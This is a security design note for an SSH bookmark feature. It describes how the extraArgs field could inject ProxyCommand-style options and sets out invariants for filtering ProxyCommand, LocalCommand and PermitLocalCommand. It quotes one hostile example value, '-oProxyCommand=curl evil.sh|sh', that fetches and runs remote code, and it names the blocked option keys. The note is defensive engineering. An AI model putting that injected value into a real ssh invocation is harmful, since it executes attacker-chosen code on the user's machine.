# Feature: SSH bookmark `extraArgs` sanitization

## Problem

The 2026-04-23 `/indie-review` sweep flagged that `SshBookmark::toSshCommand`
forwards every whitespace-separated token from the `extraArgs` bookmark
field to ssh verbatim. This lets a bookmark carrying
`-oProxyCommand=curl evil.sh|sh` hand OpenSSH an attacker-chosen shell
command (ssh executes `ProxyCommand` via `/bin/sh -c`). The `--` host
separator fix from 0.7.4 defends against dash-prefixed *hostnames* but
does nothing about `-o`-style options that sit before `--`.

The attack surface is bookmark content — which can arrive via
synced dotfile repos, user-imported config, or a malicious plugin
with write access to the config file.

## External anchors

- [OpenSSH ssh_config(5) — ProxyCommand](https://man.openbsd.org/ssh_config.5#ProxyCommand)
  — documented to run via `/bin/sh -c`.
- [ssh_config(5) — LocalCommand + PermitLocalCommand](https://man.openbsd.org/ssh_config.5#LocalCommand)
  — same shell-execution surface, gated on a separate flag.
- [CVE-2017-1000117](https://nvd.nist.gov/vuln/detail/CVE-2017-1000117) —
  git's dash-host handling, adjacent attack class.
- OpenSSH option-parser case semantics: key names are case-insensitive
  (`ProxyCommand`, `proxycommand`, `PROXYCOMMAND` all match).

## Contract

### Invariant 1 — dangerous options are stripped from extraArgs

`SshBookmark::sanitizeExtraArgs` MUST reject tokens that set any of:

- `ProxyCommand`
- `LocalCommand`
- `PermitLocalCommand`

Both the single-token form (`-oProxyCommand=...`) and the space-
separated form (`-o ProxyCommand=...`) MUST be stripped. Case-
insensitive on the key name. The filter preserves all other
`-o KEY=VAL` options, all non-option tokens, and short/long flags.

### Invariant 2 — toSshCommand delegates to sanitizeExtraArgs

The end-to-end `SshBookmark::toSshCommand` path for a bookmark whose
`extraArgs` contains a dangerous option MUST NOT emit that option to
the final ssh command line.

### Invariant 3 — rejected-tokens output is populated

When `out_rejected` is non-null, the function MUST append each
rejected raw token in source order. Callers surface this to the user
via debug-log or UI warning.

### Invariant 4 — safe options pass through

Legitimate options like `-oStrictHostKeyChecking=no`, `-p 2222`,
`-4` (IPv4-only), `-L 8080:host:80` (port forward) MUST NOT be
rejected.

## Regression history

- **Introduced:** with the initial SSH bookmark feature. The `--` host
  fix addressed dash-host injection; the `-o ProxyCommand` surface
  was known-by-design (bookmark field trusted) but never documented
  as an explicit trust boundary.
- **Discovered:** 2026-04-23 via `/indie-review`. SSH subsystem
  reviewer flagged `extraArgs` as a CVE-2017-1000117-class recurrence
  via bookmark data rather than hostnames.
- **Fixed:** 0.7.12 — `sanitizeExtraArgs` filters the three dangerous
  option keys in both spellings. X25519-auth / bookmark-signing
  (defense against malicious config writers) deferred to 0.8.x.
